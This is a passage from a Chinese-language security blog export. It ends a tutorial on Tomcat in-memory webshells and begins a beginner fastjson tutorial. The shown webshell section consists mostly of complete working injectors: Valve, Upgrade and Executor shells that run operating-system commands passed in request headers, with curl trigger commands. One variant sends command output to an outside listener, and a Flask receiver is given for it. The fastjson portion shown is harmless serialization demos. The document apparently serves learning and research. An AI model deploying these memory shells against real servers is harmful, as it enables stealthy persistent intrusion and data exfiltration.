requestField.setAccessible(true); final Request req = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) req.getContext(); standardContext.getPipeline().addValve(new testEvilValve()); out.println(&quot;inject success&quot;);%&gt; 效果如下： 5.2 Tomcat Upgrade内存马由2.14.2节中的分析，我们可以写出如下java代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.catalina.connector.Connector;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Request;import org.apache.coyote.Adapter;import org.apache.coyote.Processor;import org.apache.coyote.UpgradeProtocol;import org.apache.coyote.Response;import org.apache.coyote.http11.AbstractHttp11Protocol;import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;import org.apache.tomcat.util.net.SocketWrapperBase;import java.lang.reflect.Field;import java.nio.ByteBuffer;import java.util.HashMap;@WebServlet(&quot;/evil&quot;)public class TestUpgrade extends HttpServlet { static class MyUpgrade implements UpgradeProtocol { @Override public String getHttpUpgradeName(boolean b) { return null; } @Override public byte[] getAlpnIdentifier() { return new byte[0]; } @Override public String getAlpnName() { return null; } @Override public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) { return null; } @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) { return null; } @Override public boolean accept(org.apache.coyote.Request request) { String p = request.getHeader(&quot;cmd&quot;); try { String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, p} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, p}; Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); Response resp = (Response) response.get(request); byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;).next().getBytes(); resp.setCharacterEncoding(&quot;GBK&quot;); resp.doWrite(ByteBuffer.wrap(result)); } catch (Exception ignored) {} return false; } } @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { try { RequestFacade rf = (RequestFacade) req; Field requestField = RequestFacade.class.getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); Request request1 = (Request) requestField.get(rf); Field connector = Request.class.getDeclaredField(&quot;connector&quot;); connector.setAccessible(true); Connector realConnector = (Connector) connector.get(request1); Field protocolHandlerField = Connector.class.getDeclaredField(&quot;protocolHandler&quot;); protocolHandlerField.setAccessible(true); AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector); HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols; Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField(&quot;httpUpgradeProtocols&quot;); upgradeProtocolsField.setAccessible(true); upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler); MyUpgrade myUpgrade = new MyUpgrade(); upgradeProtocols.put(&quot;hello&quot;, myUpgrade); upgradeProtocolsField.set(handler, upgradeProtocols); } catch (Exception ignored) {} }} 运行之后执行命令curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; -H &quot;cmd: dir&quot; http://localhost:8080/evil，结果如下： jsp版本为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Connector&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.UpgradeProtocol&quot; %&gt;&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Processor&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Adapter&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;% class MyUpgrade implements UpgradeProtocol { public String getHttpUpgradeName(boolean isSSLEnabled) { return &quot;hello&quot;; } public byte[] getAlpnIdentifier() { return new byte[0]; } public String getAlpnName() { return null; } public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter) { return null; } @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter, org.apache.coyote.Request request) { return null; } @Override public boolean accept(org.apache.coyote.Request request) { String p = request.getHeader(&quot;cmd&quot;); try { String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, p} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, p}; Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); org.apache.coyote.Response resp = (org.apache.coyote.Response) response.get(request); byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;).next().getBytes(); resp.setCharacterEncoding(&quot;GBK&quot;); resp.doWrite(ByteBuffer.wrap(result)); } catch (Exception ignored){} return false; } }%&gt;&lt;% Field reqF = request.getClass().getDeclaredField(&quot;request&quot;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); Field conn = Request.class.getDeclaredField(&quot;connector&quot;); conn.setAccessible(true); Connector connector = (Connector) conn.get(req); Field proHandler = Connector.class.getDeclaredField(&quot;protocolHandler&quot;); proHandler.setAccessible(true); AbstractHttp11Protocol handler = (AbstractHttp11Protocol) proHandler.get(connector); HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = null; Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField(&quot;httpUpgradeProtocols&quot;); upgradeProtocolsField.setAccessible(true); upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler); upgradeProtocols.put(&quot;hello&quot;, new MyUpgrade()); upgradeProtocolsField.set(handler, upgradeProtocols);%&gt; 启动项目之后执行以下两条命令： 12curl http://localhost:8080/666.jspcurl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; -H &quot;cmd: dir&quot; http://localhost:8080/666.jsp 5.3 Tomcat Executor内存马由2.15.2.3的分析，我们可以写出下面的内存马： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;&lt;%@ page import=&quot;java.net.URLEncoder&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%! public Object getField(Object object, String fieldName) { Field declaredField; Class&lt;?&gt; clazz = object.getClass(); while (clazz != Object.class) { try { declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); } catch (NoSuchFieldException | IllegalAccessException ignored) {} clazz = clazz.getSuperclass(); } return null; } public Object getStandardService() { Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) { if (thread == null) { continue; } if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) { Object target = this.getField(thread, &quot;target&quot;); Object jioEndPoint = null; try { jioEndPoint = getField(target, &quot;this$0&quot;); } catch (Exception e) { } if (jioEndPoint == null) { try { jioEndPoint = getField(target, &quot;endpoint&quot;); return jioEndPoint; } catch (Exception e) { new Object(); } } else { return jioEndPoint; } } } return new Object(); } class threadexcutor extends ThreadPoolExecutor { public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) { super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler); } public void getRequest(Runnable command) { try { ByteBuffer byteBuffer = ByteBuffer.allocate(16384); byteBuffer.mark(); SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,&quot;socketWrapper&quot;); socketWrapperBase.read(false,byteBuffer); ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,&quot;socketBufferHandler&quot;),&quot;readBuffer&quot;); readBuffer.limit(byteBuffer.position()); readBuffer.mark(); byteBuffer.limit(byteBuffer.position()).reset(); readBuffer.put(byteBuffer); readBuffer.reset(); String a = new String(readBuffer.array(), StandardCharsets.UTF_8); if (a.contains(&quot;hacku&quot;)) { String b = a.substring(a.indexOf(&quot;hacku&quot;) + &quot;hacku&quot;.length() + 1, a.indexOf(&quot;\\r&quot;, a.indexOf(&quot;hacku&quot;))).trim(); if (b.length() &gt; 1) { try { Runtime rt = Runtime.getRuntime(); Process process = rt.exec(&quot;cmd /c &quot; + b); java.io.InputStream in = process.getInputStream(); java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in); java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader); StringBuilder s = new StringBuilder(); String tmp; while ((tmp = stdInput.readLine()) != null) { s.append(tmp); } if (!s.toString().isEmpty()) { byte[] res = s.toString().getBytes(StandardCharsets.UTF_8); getResponse(res); } } catch (IOException ignored) {} } } } catch (Exception ignored) {} } public void getResponse(byte[] res) { try { Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) { if (thread != null) { String threadName = thread.getName(); if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) { Object target = getField(thread, &quot;target&quot;); if (target instanceof Runnable) { try { ArrayList objects = (ArrayList) getField(getField(getField(getField(target, &quot;endpoint&quot;), &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;); for (Object tmp_object : objects) { RequestInfo request = (RequestInfo) tmp_object; Response response = (Response) getField(getField(request, &quot;req&quot;), &quot;response&quot;); String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString()); response.addHeader(&quot;Result&quot;, result); } } catch (Exception ignored) { continue; } } } } } } catch (Exception ignored) { } } @Override public void execute(Runnable command) { getRequest(command); this.execute(command, 0L, TimeUnit.MILLISECONDS); } }%&gt;&lt;% NioEndpoint nioEndpoint = (NioEndpoint) getStandardService(); ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;); threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler()); nioEndpoint.setExecutor(exe);%&gt; 关于上面的内存马的分析，请参考下面这篇文章： https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ 效果： 需要注意的是，原文中的代码没有考虑到命令输出结果中含有中文等字符的情况，所以需要url编码，这一点我在上面的代码中已改进。 当然，如果目标条件运行，你也可以利用yakit直接外带出来，jsp代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.OutputStream&quot; %&gt;&lt;%@ page import=&quot;java.net.HttpURLConnection&quot; %&gt;&lt;%@ page import=&quot;java.net.URL&quot; %&gt;&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;&lt;%@ page import=&quot;java.net.URLEncoder&quot; %&gt;&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%! public Object getField(Object object, String fieldName) { Field declaredField; Class&lt;?&gt; clazz = object.getClass(); while (clazz != Object.class) { try { declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); } catch (NoSuchFieldException | IllegalAccessException ignored) {} clazz = clazz.getSuperclass(); } return null; } public Object getStandardService() { Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) { if (thread == null) { continue; } if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) { Object target = this.getField(thread, &quot;target&quot;); Object jioEndPoint = null; try { jioEndPoint = getField(target, &quot;this$0&quot;); } catch (Exception ignored) {} if (jioEndPoint == null) { try { jioEndPoint = getField(target, &quot;endpoint&quot;); return jioEndPoint; } catch (Exception e) { new Object(); } } else { return jioEndPoint; } } } return new Object(); } class threadexcutor extends ThreadPoolExecutor { public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) { super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler); } public void getRequest(Runnable command) { try { ByteBuffer byteBuffer = ByteBuffer.allocate(16384); byteBuffer.mark(); SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command, &quot;socketWrapper&quot;); socketWrapperBase.read(false, byteBuffer); ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, &quot;socketBufferHandler&quot;), &quot;readBuffer&quot;); readBuffer.limit(byteBuffer.position()); readBuffer.mark(); byteBuffer.limit(byteBuffer.position()).reset(); readBuffer.put(byteBuffer); readBuffer.reset(); String a = new String(readBuffer.array(), StandardCharsets.UTF_8); if (a.contains(&quot;hacku&quot;)) { String b = a.substring(a.indexOf(&quot;hacku&quot;) + &quot;hacku&quot;.length() + 1, a.indexOf(&quot;\\r&quot;, a.indexOf(&quot;hacku&quot;))).trim(); if (b.length() &gt; 1) { try { Runtime rt = Runtime.getRuntime(); Process process = rt.exec(&quot;cmd /c &quot; + b); java.io.InputStream in = process.getInputStream(); java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in); java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader); StringBuilder s = new StringBuilder(); String tmp; while ((tmp = stdInput.readLine()) != null) { s.append(tmp); } if (!s.toString().isEmpty()) { byte[] res = s.toString().getBytes(StandardCharsets.UTF_8); getResponse(res); } } catch (IOException ignored) { } } } } catch (Exception ignored) {} } public void getResponse(byte[] res) { try { Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (Thread thread : threads) { if (thread != null) { String threadName = thread.getName(); if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) { Object target = getField(thread, &quot;target&quot;); if (target instanceof Runnable) { try { ArrayList objects = (ArrayList) getField(getField(getField(getField(target, &quot;endpoint&quot;), &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;); for (Object tmp_object : objects) { RequestInfo request = (RequestInfo) tmp_object; Response response = (Response) getField(getField(request, &quot;req&quot;), &quot;response&quot;); if(sendPostRequest(&quot;http://127.0.0.1:8085&quot;, res)){ response.addHeader(&quot;Result&quot;, &quot;success&quot;); } else { response.addHeader(&quot;Result&quot;, &quot;failed&quot;); } } } catch (Exception ignored) { continue; } } } } } } catch (Exception ignored) {} } private boolean sendPostRequest(String urlString, byte[] data) { try { URL url = new URL(urlString); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); connection.setRequestMethod(&quot;POST&quot;); connection.setDoOutput(true); connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;); connection.setRequestProperty(&quot;Content-Length&quot;, String.valueOf(data.length)); try (OutputStream outputStream = connection.getOutputStream()) { outputStream.write(data); outputStream.flush(); int responseCode = connection.getResponseCode(); return responseCode == HttpURLConnection.HTTP_OK; } catch (Exception ignored){ return false; } } catch (IOException ignored) { return false; } } @Override public void execute(Runnable command) { getRequest(command); this.execute(command, 0L, TimeUnit.MILLISECONDS); } }%&gt;&lt;% NioEndpoint nioEndpoint = (NioEndpoint) getStandardService(); ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;); threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler()); nioEndpoint.setExecutor(exe);%&gt; 先开启监听： 然后发送两次数据包，第一次是为了访问888.jsp，第二次是为了执行命令： 可以看到数据已经传输过来了： 当然，用yakit自带的这个是有缺陷的，就是不能持续接受，因为不能返回自定义的状态码，因此我们可以python自己写一个： 123456789101112131415from flask import Flask, requestapp = Flask(__name__)@app.route('/postendpoint', methods=['POST'])def handle_post_request(): if request.method == 'POST': if request.data: print(&quot;Received data:&quot;, request.data.decode()) return '', 200 else: return 'No data received', 400if __name__ == '__main__': app.run(debug=True) 然后修改jsp代码中的url： 最后效果如下： 六、致谢我在学习Java内存马的过程中阅读参考引用了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出，以表我诚挚的谢意： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677https://zhuanlan.zhihu.com/p/634697114https://blog.csdn.net/shelter1234567/article/details/133435490https://xz.aliyun.com/t/12494https://xz.aliyun.com/t/7348https://xz.aliyun.com/t/7388https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/https://chenlvtang.top/2022/06/22/Tomcat之Filter内存马/https://drun1baby.top/2022/08/22/Java内存马系列-03-Tomcat-之-Filter-型内存马/https://www.jb51.net/article/167204.htmhttps://f4de-bak.github.io/pages/10060c/https://tyaoo.github.io/2021/12/06/Tomcat内存马/https://github.com/bitterzzZZ/MemoryShellLearn/tree/mainhttps://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lewhttps://yzddmr6.com/posts/tomcat-context/https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lwhttps://gv7.me/articles/2020/kill-java-web-filter-memshell/https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4ghttps://xz.aliyun.com/t/9914https://goodapple.top/archives/1355https://su18.org/post/memory-shell/https://nosec.org/home/detail/5049.htmlhttps://su18.org/post/memory-shell/#控制器-拦截器-管道https://su18.org/post/memory-shell-2/#延伸线程型内存马https://javasec.org/https://www.cnblogs.com/javammc/p/15612780.htmlhttps://landgrey.me/blog/12/https://landgrey.me/blog/19/https://www.cnblogs.com/zpchcbd/p/15545773.htmlhttps://xz.aliyun.com/t/11039https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/inject-interceptor-hide-webshell/inject-interceptor-hide-webshell.mdhttps://www.cnblogs.com/bitterz/p/14859766.htmlhttps://www.javasec.org/javaweb/MemoryShell/https://www.yongsheng.site/2022/06/18/内存马(二)/https://segmentfault.com/a/1190000040939157https://developer.aliyun.com/article/925400https://su18.org/post/memory-shell/https://forum.butian.net/share/2593https://xz.aliyun.com/t/12952https://www.0kai0.cn/?p=321https://xz.aliyun.com/t/11331https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/https://cloud.tencent.com/developer/article/1888001https://blog.csdn.net/qq_41048524/article/details/131534948https://blog.csdn.net/weixin_45505313/article/details/103257933https://xz.aliyun.com/t/10372https://www.anquanke.com/post/id/224698https://forum.butian.net/share/2436http://124.223.185.138/index.php/archives/28.htmlhttps://longlone.top/安全/java/java安全/内存马/Tomcat-Valve型/https://su18.org/post/memory-shell/#tomcat-valve-内存马https://www.freebuf.com/articles/web/344321.htmlhttps://nosec.org/home/detail/5077.htmlhttps://github.com/veo/wsMemShellhttps://veo.pub/2022/memshell/https://tttang.com/archive/1673/https://www.viewofthai.link/2022/07/20/value型内存马/https://jiwo.org/ken/detail.php?id=3147https://paoka1.top/2023/04/24/Tomcat-Agent-型内存马/https://www.anquanke.com/post/id/225870https://xz.aliyun.com/t/11988https://www.cnblogs.com/piaomiaohongchen/p/14992056.htmlhttps://blog.csdn.net/text2204/article/details/129307931https://xz.aliyun.com/t/13024https://www.cnblogs.com/coldridgeValley/p/5816414.htmlhttp://wjlshare.com/archives/1541https://cloud.tencent.com/developer/article/2278400https://www.freebuf.com/vuls/345119.htmlhttps://tttang.com/archive/1709/https://xz.aliyun.com/t/11593https://xz.aliyun.com/t/11613https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executorhttps://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgradehttps://github.com/Gh0stF/trojan-eye/tree/masterhttps://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09https://xz.aliyun.com/t/12949https://paoka1.top/2023/04/21/Tomcat-WebSocket-型内存马/https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ","link":"/2024/12/30/LearnJavaMemshellFromZero/"},{"title":"零基础学fastjson漏洞（基础篇）","text":"​ 我在学习Java漏洞的时候，感觉很痛苦，不知道从何学起，因为我的Java基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问chatgpt以及问Java安全大牛师傅们，于是就有了这一系列的文章。​ 本文作为Java安全亲妈级零基础教程的第一篇Fastjson漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文除去代码一共近11000字，配图108张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究Fastjson的其他payload和Fastjson的不出网利用上，会在下一次更新。​ 我在学习Fastjson相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不觉。在写这系列的文章的时候，我常常能进入到久违的”心流“状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！​ 在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。​ 本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！ 一、前置知识1. fastjson怎么用？fastjson是啥百度就有，看了之后不熟悉的人还是会一脸懵逼，我们可以通过以下这个小例子来快速学会使用fastjson。我们分为以下几个步骤来进行： （1）在IDEA中新建一个maven项目，并引入fastjson依赖选择Maven，然后给随便取个名字，例如我起名fastjson_research。然后在pom.xml这里的末尾，添加如下内容： 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.50&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 具体Maven的各个依赖的详细信息我们可以在这个网站上面查得到： 1https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50 然后点击右侧的Maven，然后点击Reload All Maven Projects： （2）一个简单的demo123456789101112131415161718192021222324252627282930313233343536package org.example;import com.alibaba.fastjson.JSON;public class Main { public static void main(String[] args) { // 将一个 Java 对象序列化为 JSON 字符串 Person person = new Person(&quot;Alice&quot;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // 将一个 JSON 字符串反序列化为 Java 对象 String jsonString2 = &quot;{\\&quot;age\\&quot;:20,\\&quot;name\\&quot;:\\&quot;Bob\\&quot;}&quot;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + &quot;, &quot; + person2.getAge()); } // 定义一个简单的 Java 类 public static class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } }} 运行之后输出结果如下：通过以上代码我们可以看到，我们定义了一个Person类，并设置了两个属性age以及name，以及简单定义了四个方法。我们通过Person person = new Person(&quot;Alice&quot;, 18);来初始化对象，再通过String jsonString = JSON.toJSONString(person);去把对象转化为json字符串，非常方便快捷；完事之后，我们又可以通过Person person2 = JSON.parseObject(jsonString2, Person.class);把json字符串转换为Java对象，非常简单快捷。 （3）更进一步改动理解上述demo代码其实上面给出的代码是有一些问题的，这个问题并不是指代码本身错误。 ①问题1：Person person2 = JSON.parseObject(jsonString2, Person.class);这里为什么可以直接使用Person.class来进行映射？在使用fastjson时，我们需要先将JSON字符串和Java对象之间建立映射关系，可以通过类的属性和JSON字段名进行映射。在我们上面的代码中，Java类的属性名和JSON字段名是相同的，因此可以直接使用Person.class来进行映射。如果不同我们该怎么办？我们可以通过使用注解来指定它们之间的映射关系。在fastjson中，可以使用@JSONField注解来指定Java类的属性和JSON字段之间的映射关系。请看以下demo代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.annotation.JSONField;public class Main { public static void main(String[] args) { // 将一个 Java 对象序列化为 JSON 字符串 Person person = new Person(&quot;Alice&quot;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // 将一个 JSON 字符串反序列化为 Java 对象 String jsonString2 = &quot;{\\&quot;user_name\\&quot;:\\&quot;Bob\\&quot;,\\&quot;user_age\\&quot;:20}&quot;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + &quot;, &quot; + person2.getAge()); } // 定义一个简单的 Java 类 public static class Person { @JSONField(name = &quot;user_name&quot;) private String name; @JSONField(name = &quot;user_age&quot;) private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } }} 可以看到，我们在定义name和age的时候，在上面分别加入了一行@JSONField(name = &quot;user_name&quot;)和@JSONField(name = &quot;user_age&quot;)，这样一来，即使我们输入的字符串中写的是user_name和user_age，它也能被识别解析到。 ②问题2：为什么我初始化对象的时候，代码明明写的是Person person = new Person(&quot;Alice&quot;, 18);，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？原来，在fastjson中，默认情况下，生成的JSON字符串的顺序是按照属性的字母顺序进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成JSON字符串，可以通过在类中使用@JSONType注解来设置属性的序列化顺序，请看下面的代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.annotation.JSONType;public class Main { public static void main(String[] args) { // 将一个 Java 对象序列化为 JSON 字符串 Person person = new Person(&quot;Alice&quot;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // 将一个 JSON 字符串反序列化为 Java 对象 String jsonString2 = &quot;{\\&quot;name\\&quot;:\\&quot;Bob\\&quot;,\\&quot;age\\&quot;:20}&quot;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + &quot;, &quot; + person2.getAge()); } // 定义一个简单的 Java 类 @JSONType(orders = 